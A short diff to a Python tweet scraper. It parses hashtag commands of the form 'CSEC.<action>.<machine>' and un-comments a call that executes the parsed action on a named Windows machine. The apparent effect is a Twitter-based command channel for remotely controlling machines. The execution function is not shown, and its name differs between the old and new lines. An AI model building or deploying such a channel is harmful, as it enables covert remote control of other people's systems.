@@ -93,7 +93,7 @@ class TweetScrape():
 
             Return: Twitter commands.
         '''
-        cmd = re.search(r"(CSEC)\.\w+\.\w+", content) # Hash tagto use followed by a space the command another space and the target machine.
+        cmd = re.search(r"(CSEC)\.\w+\.\w+", str(content)) # Hash tagto use followed by a space the command another space and the target machine.
         if cmd == None:
             print(content) # Debugging
         else:
@@ -138,7 +138,7 @@ class TweetScrape():
         action = dottedTweet.split(".")[2]
         print("Action: " + str(action) + " applied to machine " + str(machine))
 
-        #windows_cmdExection(action, machine) # Commented out for debugging purposes.
+        windows_cmdExcution(action, machine)
 
 
 if __name__ == "__main__":
